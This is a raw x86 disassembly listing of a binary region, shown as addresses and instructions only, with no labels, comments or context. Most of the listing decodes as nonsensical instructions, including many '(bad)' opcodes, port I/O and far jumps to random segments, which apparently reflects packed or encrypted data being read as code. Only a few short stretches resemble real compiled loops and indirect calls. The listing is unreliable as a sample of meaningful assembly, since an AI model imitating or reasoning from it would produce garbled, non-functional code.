  409b09:	ret    0xd8b1
  409b0c:	cmp    ecx,DWORD PTR [ecx]
  409b0e:	in     eax,0x6b
  409b10:	xchg   edx,eax
  409b11:	jl     0x409b3f
  409b13:	xchg   ecx,eax
  409b14:	div    DWORD PTR [eax+0x1c328700]
  409b1a:	sub    eax,0x9eed25ea
  409b1f:	inc    eax
  409b20:	mov    WORD PTR [edi-0x21],ds
  409b23:	mov    cl,0x74
  409b25:	pushf  
  409b26:	cmp    eax,DWORD PTR [ecx-0x60]
  409b29:	xchg   ebx,eax
  409b2a:	xor    DWORD PTR [ebp-0x3686922b],0x29
  409b31:	cmp    al,ah
  409b33:	mov    dh,0x5b
  409b35:	sub    al,0x95
  409b37:	sub    ah,ch
  409b39:	bound  ebx,QWORD PTR [esi+0x3dd695f9]
  409b3f:	mov    eax,ds:0xbd689850
  409b44:	ret    0xcbbc
  409b47:	mov    ebx,0xdcbc9229
  409b4c:	push   0x5acbdf8c
  409b51:	inc    ecx
  409b52:	mov    ch,0x39
  409b54:	rep lods eax,DWORD PTR ds:[esi]
  409b56:	leave  
  409b57:	cs jmp 0x9940:0x1125ae24
  409b5f:	retf   
  409b60:	jecxz  0x409bd2
  409b62:	sbb    BYTE PTR [edi-0xa],bl
  409b65:	mov    es,WORD PTR [ebx+0x41]
  409b68:	xchg   edi,eax
  409b69:	ins    BYTE PTR es:[edi],dx
  409b6a:	adc    DWORD PTR ds:0x482260c,eax
  409b70:	repz mov esp,0x33753335
  409b76:	int3   
  409b77:	cmp    eax,0x1818e706
  409b7c:	cmp    ecx,ebp
  409b7e:	pop    ebp
  409b7f:	dec    ebp
  409b80:	ds daa 
  409b82:	mov    dl,0x5c
  409b84:	outs   dx,BYTE PTR ds:[esi]
  409b85:	cmc    
  409b86:	add    bh,dl
  409b88:	cmp    bh,BYTE PTR [edx-0x50]
  409b8b:	inc    ebx
  409b8c:	lea    ebx,[edx]
  409b8e:	jae    0x409b37
  409b90:	aam    0xd7
  409b92:	and    al,0x5a
  409b94:	sar    DWORD PTR [edi+0x1f2d2b37],0x78
  409b9b:	mov    WORD PTR [edi-0x57],?
  409b9e:	push   ecx
  409b9f:	out    dx,al
  409ba0:	push   edi
  409ba1:	outs   dx,BYTE PTR ds:[esi]
  409ba2:	test   al,0x94
  409ba4:	mov    ebp,0x52be0363
  409ba9:	popa   
  409baa:	pop    ecx
  409bab:	push   es
  409bac:	(bad)  
  409bad:	daa    
  409bae:	jmp    ecx
  409bb0:	dec    ebx
  409bb1:	pop    ds
  409bb2:	hlt    
  409bb3:	pop    esp
  409bb4:	cmc    
  409bb5:	(bad)  
  409bb6:	sbb    DWORD PTR [eax+0x41],edi
  409bb9:	int3   
  409bba:	fcom   QWORD PTR [ebx-0x15255766]
  409bc0:	imul   edi,DWORD PTR [ebx],0xffffffed
  409bc3:	int    0x19
  409bc5:	stos   DWORD PTR es:[edi],eax
  409bc6:	add    edx,edi
  409bc8:	push   edx
  409bc9:	aad    0x20
  409bcb:	mov    ecx,0xb3f5f1a1
  409bd0:	and    DWORD PTR [bx+di-0x1b],0x8f9e17cf
  409bd8:	call   0x8b29:0x935c8944
  409bdf:	int3   
  409be0:	cmp    dh,BYTE PTR ds:0xdfcb84e9
  409be6:	mov    esi,0x50bf8c
  409beb:	mov    eax,0xf7813931
  409bf0:	aam    0x28
  409bf2:	cmp    BYTE PTR gs:[edi-0x4465838c],0xd4
  409bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bfb:	and    BYTE PTR [ecx+0x2a],ah
  409bfe:	mov    bl,0x79
  409c00:	push   ss
  409c01:	fs scas al,BYTE PTR es:[edi]
  409c03:	xor    esi,ebp
  409c05:	mul    DWORD PTR [ecx]
  409c07:	les    ebx,FWORD PTR [eax+ebx*2]
  409c0a:	mov    WORD PTR [edx+0xf],?
  409c0d:	add    BYTE PTR ds:0xeca643c9,0xd
  409c14:	(bad)  
  409c15:	rol    BYTE PTR [edx+0x29],1
  409c18:	push   ebx
  409c19:	push   esp
  409c1a:	nop
  409c1b:	or     edx,esp
  409c1d:	xor    DWORD PTR [eax],ecx
  409c1f:	or     al,BYTE PTR [edx+0x3d030ff3]
  409c25:	lods   al,BYTE PTR ds:[esi]
  409c26:	mov    WORD PTR ds:0xf71fd3c3,ss
  409c2c:	idiv   DWORD PTR [ebx+0x4d]
  409c2f:	aas    
  409c30:	xor    BYTE PTR [eax],dl
  409c32:	and    BYTE PTR [edx-0x31],bh
  409c35:	xor    eax,0xfa7c8ec3
  409c3a:	hlt    
  409c3b:	mov    BYTE PTR [edi+0x49cd5d09],ch
  409c41:	jae    0x409c9b
  409c43:	jo     0x409c51
  409c45:	cmp    cl,BYTE PTR [ebp+0x44]
  409c48:	dec    ebx
  409c49:	iret   
  409c4a:	and    edi,esp
  409c4c:	pop    ss
  409c4d:	adc    al,0x13
  409c4f:	imul   ecx,DWORD PTR [ebp+0x1f09994a],0xd
  409c56:	adc    BYTE PTR [ebx],ah
  409c58:	retf   0x9e8d
  409c5b:	sbb    edi,DWORD PTR [edx+eax*2+0x4e8f2073]
  409c62:	nop
  409c63:	loop   0x409c23
  409c65:	xchg   edi,eax
  409c66:	push   0x83cedc4f
  409c6b:	cmp    ebx,DWORD PTR [esi]
  409c6d:	out    0x26,eax
  409c6f:	das    
  409c70:	mov    bl,ch
  409c72:	call   0x9acdd281
  409c77:	pop    DWORD PTR [ebp+0x707a043e]
  409c7d:	sbb    eax,edi
  409c7f:	mov    WORD PTR [ebx-0x4b043443],gs
  409c85:	rcr    BYTE PTR [ebx],1
  409c87:	lahf   
  409c88:	lea    edx,[edx+ebp*4]
  409c8b:	adc    al,0xb4
  409c8d:	lahf   
  409c8e:	add    BYTE PTR [ebx-0x15939241],dl
  409c94:	int3   
  409c95:	push   0x3a8c0c3a
  409c9a:	push   edi
  409c9b:	jo     0x409c51
  409c9d:	pop    ss
  409c9e:	push   ss
  409c9f:	dec    edi
  409ca0:	sahf   
  409ca1:	push   esi
  409ca2:	dec    edi
  409ca3:	int3   
  409ca4:	not    BYTE PTR [ecx+0x2]
  409ca7:	mov    cl,0x98
  409ca9:	stc    
  409caa:	mov    es,WORD PTR [ecx]
  409cac:	in     al,0xea
  409cae:	setbe  BYTE PTR [ebp+ebx*4+0x5]
  409cb3:	and    BYTE PTR [eax+0x1e],dl
  409cb6:	pusha  
  409cb7:	out    dx,eax
  409cb8:	scas   eax,DWORD PTR es:[edi]
  409cb9:	pusha  
  409cba:	push   ebp
  409cbb:	pop    esp
  409cbc:	jns    0x409d1c
  409cbe:	xor    DWORD PTR [ecx],eax
  409cc0:	add    eax,0xaae279fa
  409cc5:	je     0x409d13
  409cc7:	clc    
  409cc8:	mov    edi,0x8b120fe0
  409ccd:	and    bl,BYTE PTR [ebx+0x61b43cfd]
  409cd3:	shr    BYTE PTR [ebx*4+0x71001a28],1
  409cda:	add    DWORD PTR ds:0x9cdd44ef,ecx
  409ce0:	in     eax,dx
  409ce1:	fisub  DWORD PTR [esi]
  409ce3:	dec    eax
  409ce4:	rcl    DWORD PTR [eax-0x6c01a15],cl
  409cea:	adc    eax,0xdf7e56a1
  409cef:	mov    WORD PTR [ebp-0x30],fs
  409cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cf3:	fldenv [eax-0x33163cab]
  409cf9:	mov    cs,WORD PTR [ecx+esi*8-0x6afc3177]
  409d00:	pop    edi
  409d01:	pop    ss
  409d02:	pop    ds
  409d03:	jp     0x409d1f
  409d05:	aam    0x28
  409d07:	ficom  WORD PTR [ebx]
  409d09:	push   edi
  409d0a:	pop    eax
  409d0b:	retf   
  409d0c:	inc    esi
  409d0d:	jae    0x409cda
  409d0f:	call   0x12e73540
  409d14:	xchg   esi,eax
  409d15:	test   BYTE PTR [ecx],al
  409d17:	stos   DWORD PTR es:[edi],eax
  409d18:	mov    ch,0xed
  409d1a:	test   eax,0x23292501
  409d1f:	ror    BYTE PTR [eax+0x5087800b],1
  409d25:	push   0x20eb3287
  409d2a:	pop    ds
  409d2b:	clc    
  409d2c:	sysenter 
  409d2e:	test   DWORD PTR [edx+eax*4+0x2ec37a21],0x927d038a
  409d39:	adc    al,0xb8
  409d3b:	or     ecx,eax
  409d3d:	rol    BYTE PTR [ebp-0x1d],1
  409d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d41:	bnd jno 0x409d0d
  409d44:	lahf   
  409d45:	out    dx,eax
  409d46:	or     DWORD PTR [ebp-0x4fcc492],edx
  409d4c:	jno    0x409cd3
  409d4e:	adc    ebx,DWORD PTR [esi+0x36b22062]
  409d54:	outs   dx,DWORD PTR ds:[esi]
  409d55:	(bad)  
  409d56:	pushf  
  409d57:	out    dx,eax
  409d58:	dec    edi
  409d59:	push   0x1a
  409d5b:	or     BYTE PTR [ebx+0x6a],bl
  409d5e:	jno    0x409d93
  409d60:	sbb    esi,edx
  409d62:	pop    ebx
  409d63:	jne    0x409dca
  409d65:	jo     0x409d9e
  409d67:	and    DWORD PTR [edx],eax
  409d69:	cmp    BYTE PTR [edx],ch
  409d6b:	adc    al,0x4a
  409d6d:	pop    ebp
  409d6e:	xlat   BYTE PTR ds:[ebx]
  409d6f:	or     cl,BYTE PTR [eax+ebp*8+0xb0ecd92]
  409d76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d77:	fcmovbe st,st(6)
  409d79:	das    
  409d7a:	jg     0x409d4c
  409d7c:	push   ebp
  409d7d:	fnstcw WORD PTR [edx]
  409d7f:	(bad)  
  409d80:	(bad)  
  409d81:	test   ax,0x7f91
  409d85:	xchg   edi,eax
  409d86:	repz sub BYTE PTR [esi-0x53177d8a],ah
  409d8d:	xor    eax,0x666a8c38
  409d92:	push   ecx
  409d93:	jnp    0x409e0d
  409d95:	test   al,0x5b
  409d97:	adc    BYTE PTR [bx],0xef
  409d9b:	test   al,0x7b
  409d9d:	inc    esp
  409d9e:	das    
  409d9f:	pop    esp
  409da0:	aas    
  409da1:	stos   DWORD PTR es:[edi],eax
  409da2:	cdq    
  409da3:	push   ss
  409da4:	lahf   
  409da5:	lds    esp,FWORD PTR [edx-0x5e]
  409da8:	inc    ebx
  409da9:	pop    ss
  409daa:	lock jmp 0xc420dfc2
  409db0:	jnp    0x409e25
  409db2:	cwde   
  409db3:	inc    esi
  409db5:	leave  
  409db6:	adc    al,0xe1
  409db8:	ret    0xcc90
  409dbb:	loopne 0x409d72
  409dbd:	test   DWORD PTR es:[esi-0x8],edi
  409dc1:	pusha  
  409dc2:	push   esp
  409dc3:	sub    ah,BYTE PTR [eax]
  409dc5:	adc    DWORD PTR [esi-0x6],0x44
  409dc9:	leave  
  409dca:	cmp    eax,0xd12df6b6
  409dcf:	int3   
  409dd0:	jmp    0x1872:0xfbb21975
  409dd7:	outs   dx,DWORD PTR ds:[esi]
  409dd8:	lods   eax,DWORD PTR ds:[esi]
  409dd9:	push   ds
  409dda:	(bad)  
  409ddb:	call   0x1bf4:0x7fc01956
  409de2:	add    bh,cl
  409de4:	ja     0x409e35
  409de6:	in     eax,0x9b
  409de8:	lahf   
  409de9:	mov    cl,0x31
  409deb:	push   edx
  409dec:	outs   dx,DWORD PTR ds:[esi]
  409ded:	out    dx,eax
  409dee:	pop    ss
  409def:	psubusb mm0,QWORD PTR [ebx+esi*2+0x74]
  409df4:	cmp    eax,0xfa894935
  409df9:	ja     0x409e54
  409dfb:	call   0x3547:0x1ea080a
  409e02:	mov    esi,0x360b0b9
  409e07:	shl    DWORD PTR [ecx],1
  409e09:	or     eax,0x42fe0a
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fd79
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e1a4
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fe02,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fe02,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fe02,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e363
  409e51:	mov    edi,DWORD PTR ds:0x42fe02
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fe02,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e783,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	jb     0x409eeb
  409e83:	mov    eax,ds:0x70e826b5
  409e88:	jo     0x409e29
  409e8a:	jge    0x409efc
  409e8c:	jo     0x409e87
  409e8e:	or     eax,0x1102bbea
  409e93:	or     al,al
  409e95:	lock jnp 0x409eb5
  409e98:	jp     0x409eac
  409e9a:	js     0x409e25
  409e9c:	dec    esp
  409e9d:	mov    bl,0x65
  409e9f:	xchg   ecx,eax
  409ea0:	mov    bl,0xcb
  409ea2:	sub    eax,0x5e7e1896
  409ea7:	lds    eax,FWORD PTR [esi+edx*1-0x68c5d2b8]
  409eae:	gs xchg esi,eax
  409eb0:	test   DWORD PTR [esi],edx
  409eb2:	int    0x44
  409eb4:	inc    ebp
  409eb5:	je     0x409e80
  409eb7:	mov    bl,0x3a
  409eb9:	sbb    esp,DWORD PTR [ebx]
  409ebb:	(bad)  
  409ebc:	jmp    0x409e58
  409ebe:	inc    edx
  409ebf:	sbb    bl,BYTE PTR [ecx]
  409ec1:	push   ebx
  409ec2:	hlt    
  409ec3:	add    al,BYTE PTR [ebp-0x41952517]
  409ec9:	les    ebp,FWORD PTR [edi+0x1dee9559]
  409ecf:	jo     0x409f27
  409ed1:	lods   eax,DWORD PTR ds:[esi]
  409ed2:	test   DWORD PTR [edx+0x4b],eax
  409ed5:	cmp    al,0x96
  409ed7:	push   cs
  409ed8:	jge    0x409f45
  409eda:	sbb    bl,BYTE PTR [edi+0x19]
  409edd:	out    0x36,eax
  409edf:	mov    edx,0xc6cd5e4c
  409ee4:	mov    cl,0xf4
  409ee6:	test   eax,0x2e100ddd
  409eeb:	xor    al,0x69
  409eed:	stos   DWORD PTR es:[edi],eax
  409eee:	sti    
  409eef:	lock mov ebx,0x115c7dac
  409ef5:	xchg   esi,eax
  409ef6:	push   esp
  409ef7:	addr16 sub ah,ah
  409efa:	nop
  409efb:	outs   dx,DWORD PTR ds:[esi]
  409efc:	fwait
  409efd:	vsubpd ymm4,ymm6,YMMWORD PTR [ecx+ebp*1-0x2c]
  409f03:	lods   eax,DWORD PTR ds:[esi]
  409f04:	inc    eax
  409f05:	fcom   QWORD PTR es:[ebx]
  409f08:	push   esp
  409f09:	dec    edx
  409f0a:	fdivr  QWORD PTR [edi+esi*1-0x62ed8839]
  409f11:	dec    edx
  409f12:	adc    BYTE PTR ds:0xd65019d4,ch
  409f18:	int    0xe8
  409f1a:	lea    ebp,[edx+0x4d]
  409f1d:	ss jmp 0x92a37446
  409f23:	ins    BYTE PTR es:[edi],dx
  409f24:	(bad)  
  409f25:	mov    al,0x53
  409f27:	ret    0x45ed
  409f2a:	psubsw mm7,mm5
  409f2d:	sbb    BYTE PTR [ebx+esi*8+0x77],dh
  409f31:	and    ah,bh
  409f33:	pop    ebp
  409f34:	loope  0x409f28
  409f36:	push   edx
  409f37:	push   esp
  409f38:	and    BYTE PTR [eax-0x3c7b2e5a],bh
  409f3e:	mov    dh,0xbd
  409f40:	push   0x27bf522
  409f45:	loop   0x409f05
  409f47:	inc    edi
  409f48:	jle    0x409fb8
  409f4a:	mov    bl,0x3c
  409f4c:	push   DWORD PTR [eax-0x2fc59c31]
  409f52:	add    BYTE PTR [ecx-0x71],cl
  409f55:	xor    eax,0x32d5d3d8
  409f5a:	xlat   BYTE PTR ds:[ebx]
  409f5b:	sub    DWORD PTR [esi+0x1cf6103],ecx
  409f61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f62:	and    DWORD PTR [eax+0x68d7b575],0x88bdd889
  409f6c:	imul   edx,esp,0x6d
  409f6f:	cmp    eax,0x19e47d14
  409f74:	je     0x409f66
  409f76:	jmp    0x6b86:0x3e7f982a
  409f7d:	mov    ecx,0x46f3e199
  409f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f83:	mov    edx,0x93455f9
  409f88:	and    eax,0xbfb99adc
  409f8d:	icebp  
  409f8e:	sbb    edx,DWORD PTR [esi-0x4b659118]
  409f94:	scas   al,BYTE PTR es:[edi]
  409f95:	adc    al,0x58
  409f97:	push   0xaf3fcedc
  409f9c:	lock jno 0x409f75
  409f9f:	js     0x409f75
  409fa1:	js     0x40a00c
  409fa3:	aam    0xa4
  409fa5:	xchg   esp,eax
  409fa6:	in     eax,0xc5
  409fa8:	pop    ebp
  409fa9:	adc    al,BYTE PTR [esi-0x80]
  409fac:	jb     0x409fe0
  409fae:	ret    0x83fd
  409fb1:	or     BYTE PTR [ebx+0x2f9b71f],0x5a
  409fb8:	jns    0x40a02e
  409fba:	mov    dh,0xe0
  409fbc:	mov    ds:0x7caf58fc,al
  409fc1:	push   ebp
  409fc2:	sti    
  409fc3:	add    al,0x8c
  409fc5:	call   0x92f2:0xeb752a5b
  409fcc:	sub    al,0x28
  409fce:	jmp    0x409f6f
  409fd0:	ins    BYTE PTR es:[edi],dx
  409fd1:	dec    edi
  409fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fd3:	test   BYTE PTR fs:[ebx],0xb
  409fd7:	repz (bad) 
  409fd9:	push   0x33
  409fdb:	add    al,0x39
  409fdd:	loop   0x40a028
  409fdf:	(bad)  
  409fe0:	cmp    BYTE PTR [edx],dl
  409fe2:	ja     0x40a018
  409fe4:	sub    DWORD PTR [ebp-0x49],ebp
  409fe7:	push   ss
  409fe8:	nop
  409fe9:	fsubr  DWORD PTR [edi+0x1620d3b2]
  409fef:	inc    edx
  409ff0:	sbb    bh,BYTE PTR ds:0xac4e0814
  409ff6:	pop    esp
  409ff7:	pusha  
  409ff8:	test   al,0x65
  409ffa:	test   BYTE PTR [edi-0x13],bl
  409ffd:	call   0x854e47b3
  40a002:	ins    DWORD PTR es:[edi],dx
  40a003:	dec    ebp
  40a004:	aad    0x90
  40a006:	sti    
  40a007:	cmc    
  40a008:	jb     0x40a001
  40a00a:	pop    esi
  40a00b:	jns    0x40a018
  40a00d:	jo     0x409fe8
  40a00f:	pop    esi
  40a010:	loope  0x40a07d
  40a012:	add    al,0x80
  40a014:	(bad)  [eiz*1-0x66238279]
  40a01b:	dec    esi
  40a01c:	push   cs
  40a01d:	cmp    BYTE PTR [edx-0xd],dl
  40a020:	out    dx,al
  40a021:	adc    al,0xff
  40a023:	out    dx,eax
  40a024:	fidivr WORD PTR [eax-0x1b831a81]
  40a02a:	std    
  40a02b:	cmc    
  40a02c:	jl     0x40a058
  40a02e:	mov    esp,0xf57dec9
  40a033:	aaa    
  40a034:	add    DWORD PTR [ebx],eax
  40a036:	gs scas al,BYTE PTR es:[edi]
  40a038:	pop    ss
  40a039:	dec    edi
  40a03a:	mov    ebx,0xe34b07b3
  40a03f:	fstp   QWORD PTR [edx-0x4a]
  40a042:	push   0x22
  40a044:	std    
  40a045:	ret    0xb2e
  40a048:	xlat   BYTE PTR ds:[ebx]
  40a049:	lds    esp,FWORD PTR [ebx+eiz*8]
  40a04c:	aas    
  40a04d:	mov    ecx,0xb9e02a69
  40a052:	retf   
  40a053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a054:	xchg   edx,eax
  40a055:	add    esi,edx
  40a057:	fucom  st(3)
  40a059:	and    eax,0xad6ec924
  40a05e:	add    bl,bh
  40a060:	xchg   edi,eax
  40a061:	push   ebx
  40a062:	push   ss
  40a063:	gs out dx,eax
  40a065:	ficomp DWORD PTR [edi-0x6ebffc58]
  40a06b:	mov    dl,BYTE PTR [edx]
  40a06d:	and    al,0xfb
  40a06f:	add    al,0xe0
  40a071:	call   0xcd7b417e
  40a076:	stc    
  40a077:	push   edx
  40a078:	test   DWORD PTR [esi],ecx
  40a07a:	or     dl,ch
  40a07c:	xlat   BYTE PTR ds:[ebx]
  40a07d:	pop    es
  40a07e:	ins    DWORD PTR es:[edi],dx
  40a07f:	clc    
  40a080:	push   esp
  40a081:	xor    al,0x97
  40a083:	mov    bh,0xb
  40a085:	(bad)  
  40a086:	sbb    eax,0xa41d7437
  40a08b:	les    eax,FWORD PTR [esp+ebx*1+0x55]
  40a08f:	(bad)  
  40a091:	test   BYTE PTR [ebx+0x65],0x71
  40a095:	loopne 0x40a0c9
  40a097:	into   
  40a098:	inc    esi
  40a099:	pop    ebx
  40a09a:	out    dx,eax
  40a09b:	lahf   
  40a09c:	lods   eax,DWORD PTR ds:[esi]
  40a09d:	xchg   BYTE PTR [esi],dl
  40a09f:	xlat   BYTE PTR ds:[ebx]
  40a0a0:	sbb    ebp,DWORD PTR [edi-0x6a]
  40a0a3:	test   BYTE PTR [ecx-0x6d],bh
  40a0a6:	lock (bad) 
  40a0a8:	icebp  
  40a0a9:	addr16 xchg ebp,eax
  40a0ab:	push   es
  40a0ac:	inc    esp
  40a0ad:	pop    edi
  40a0ae:	push   esi
  40a0af:	lods   al,BYTE PTR ds:[esi]
  40a0b0:	lock xor DWORD PTR [eax+0x5ba4fbb],eax
  40a0b7:	fwait
  40a0b8:	xor    cl,BYTE PTR [edi+0x2d5f507f]
  40a0be:	lock daa 
  40a0c0:	mov    esi,0xa0698e84
  40a0c5:	and    al,0xaa
  40a0c7:	lds    edi,FWORD PTR [edx-0x45d61db0]
  40a0cd:	(bad)  
  40a0ce:	sbb    ah,BYTE PTR [edx+0x585bccdc]
  40a0d4:	pop    esp
  40a0d5:	push   esi
  40a0d6:	xor    BYTE PTR [edi-0x5e752d05],dh
  40a0dc:	sbb    bl,BYTE PTR [ebp-0x7e]
  40a0df:	out    0x66,al
  40a0e1:	mov    eax,0x396b695a
  40a0e6:	push   ebx
  40a0e7:	arpl   WORD PTR [esi-0x28],cx
  40a0ea:	icebp  
  40a0eb:	popa   
  40a0ec:	data16 js 0x40a079
  40a0ef:	pop    ds
  40a0f0:	imul   esi,DWORD PTR [edi],0xffffffa8
  40a0f3:	jecxz  0x40a15d
  40a0f5:	hlt    
  40a0f6:	pushf  
  40a0f7:	jb     0x40a13a
  40a0f9:	ror    BYTE PTR [eax+0x20],0xcc
  40a0fd:	mov    ah,BYTE PTR [edi+0x21]
  40a100:	les    eax,FWORD PTR [edx+0x33]
  40a103:	mov    esi,0xbca704b3
  40a108:	mov    dh,0x40
  40a10a:	nop
  40a10b:	mov    esp,0x6033ed80
  40a110:	inc    esp
  40a111:	xchg   edi,eax
  40a112:	jecxz  0x40a160
  40a114:	fisttp WORD PTR [ebp-0x38]
  40a117:	arpl   WORD PTR [eax],di
  40a119:	sar    BYTE PTR [esi],1
  40a11b:	scas   al,BYTE PTR es:[edi]
  40a11c:	nop
  40a11d:	sbb    eax,0x63145266
  40a122:	xchg   DWORD PTR [esi+ecx*4-0x56adb809],ebp
  40a129:	in     al,0xb8
  40a12b:	sar    DWORD PTR [esi-0x71],1
  40a12e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a12f:	and    esi,eax
  40a131:	lods   eax,DWORD PTR ds:[esi]
  40a132:	sub    DWORD PTR [edx-0x658d61d7],0x14
  40a139:	jle    0x40a0c4
  40a13b:	int    0x8f
  40a13d:	mov    edi,0xfbfedc44
  40a142:	int3   
  40a143:	repz clc 
  40a145:	call   0xf5d2f1c6
  40a14a:	mov    bh,BYTE PTR [edx+0x24]
  40a14d:	mov    edi,0xfa0d44fb
  40a152:	out    dx,eax
  40a153:	adc    eax,DWORD PTR [eax+0x42dfe41]
  40a159:	loope  0x40a106
  40a15b:	sub    ah,bh
  40a15d:	jle    0x40a16f
  40a15f:	inc    esi
  40a160:	stos   BYTE PTR es:[edi],al
  40a161:	add    DWORD PTR [ebp+0x739c5f28],ecx
  40a167:	mov    ds:0x275dc5b2,al
  40a16c:	retf   0x45b3
  40a16f:	fidivr DWORD PTR [edx]
  40a171:	jmp    DWORD PTR [edx+ecx*4-0x6c40902a]
  40a178:	push   eax
  40a179:	inc    edi
  40a17a:	cld    
  40a17b:	pop    edi
  40a17c:	dec    ebp
  40a17d:	cmp    al,0x15
  40a17f:	sbb    al,0xc5
  40a181:	sbb    ecx,DWORD PTR [edi+0x4e40e5b6]
  40a187:	cdq    
  40a188:	(bad)  
  40a189:	pop    ebp
  40a18a:	retf   0xde6b
  40a18d:	gs inc eax
  40a18f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a190:	jbe    0x40a1d9
  40a192:	retf   
  40a193:	std    
  40a194:	add    al,0x4a
  40a196:	aam    0x52
  40a198:	cmp    eax,0xcdf9bac5
  40a19d:	mov    ecx,0x5c28c981
  40a1a2:	into   
  40a1a3:	jge    0x40a1c3
  40a1a5:	test   al,0xd7
  40a1a7:	push   ebx
  40a1a8:	push   eax
  40a1a9:	call   0xb4cf:0x2878442
  40a1b0:	sub    BYTE PTR [edi+0x21],bh
  40a1b3:	xor    eax,0x890e8ebe
  40a1b8:	inc    edx
  40a1b9:	lods   eax,DWORD PTR ds:[esi]
  40a1ba:	in     al,0xf5
  40a1bc:	rcr    DWORD PTR [eax],0x9
  40a1bf:	das    
  40a1c0:	std    
  40a1c1:	mov    al,0x4e
  40a1c3:	outs   dx,DWORD PTR ds:[esi]
  40a1c4:	cmp    eax,0x48292df7
  40a1c9:	cmc    
  40a1ca:	out    dx,al
  40a1cb:	or     al,0xd8
  40a1cd:	inc    ecx
  40a1ce:	sub    DWORD PTR [edi],eax
  40a1d0:	retf   0xa5f0
  40a1d3:	lahf   
  40a1d4:	sub    BYTE PTR [ecx+0x63bf4aed],0xfb
  40a1db:	gs inc esi
  40a1dd:	(bad)  
  40a1de:	test   al,0xf9
  40a1e0:	loop   0x40a21a
  40a1e2:	sbb    dl,BYTE PTR [ebx]
  40a1e4:	jl     0x40a253
  40a1e6:	data16 or bh,BYTE PTR [edx]
  40a1e9:	add    eax,edi
  40a1eb:	xor    DWORD PTR [edi-0x35376efb],esi
  40a1f1:	push   0xd6ef8cdb
  40a1f6:	fwait
  40a1f7:	scas   eax,DWORD PTR es:[edi]
  40a1f8:	test   eax,0x7c79d17d
  40a1fd:	dec    edx
  40a1fe:	pop    ecx
  40a1ff:	inc    ebp
  40a200:	(bad)  
  40a201:	ret    0xe0fc
  40a204:	xor    esp,ebp
  40a206:	add    dl,BYTE PTR [edi+edi*1+0x59]
  40a20a:	aaa    
  40a20b:	and    DWORD PTR ds:0x84ec8716,edx
  40a211:	outs   dx,BYTE PTR ds:[esi]
  40a212:	scas   al,BYTE PTR es:[edi]
  40a213:	in     eax,0x5c
  40a215:	adc    al,0x53
  40a217:	popf   
  40a218:	xchg   ecx,eax
  40a219:	dec    edx
  40a21a:	sbb    edi,DWORD PTR [eax+0x270e1f10]
  40a220:	add    DWORD PTR [ecx+ecx*4+0x47],eax
  40a224:	mov    ebp,0x9c3c407c
  40a229:	mov    edx,edx
  40a22b:	push   ebx
  40a22c:	add    esp,DWORD PTR [esi]
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fd6d,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fd6d
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fd6d,edx
  40a263:	cmp    DWORD PTR ds:0x42fd6d,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fd6d,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e367
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e1a8,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e78f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	retf   
  40a2c5:	mov    ax,0x454e
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a293
  40a2d1:	retf   0x1485
  40a2d4:	and    BYTE PTR [eax],al
  40a2d6:	int3   
  40a2d7:	jae    0x40a278
  40a2d9:	jp     0x40a314
  40a2db:	aaa    
  40a2dc:	adc    eax,ebp
  40a2de:	bound  ecx,QWORD PTR [edi-0x78]
  40a2e1:	add    al,BYTE PTR ds:0xce1dd9bc
  40a2e7:	ret    0xb6c3
  40a2ea:	jnp    0x40a2c4
  40a2ec:	sahf   
  40a2ed:	ss mov esp,0x3fd51dcd
  40a2f3:	ds jnp 0x40a299
  40a2f6:	fidivr DWORD PTR ds:0x7623cad0
  40a2fc:	push   ss
  40a2fd:	(bad)  
  40a2fe:	xchg   edi,eax
  40a2ff:	in     al,0xe2
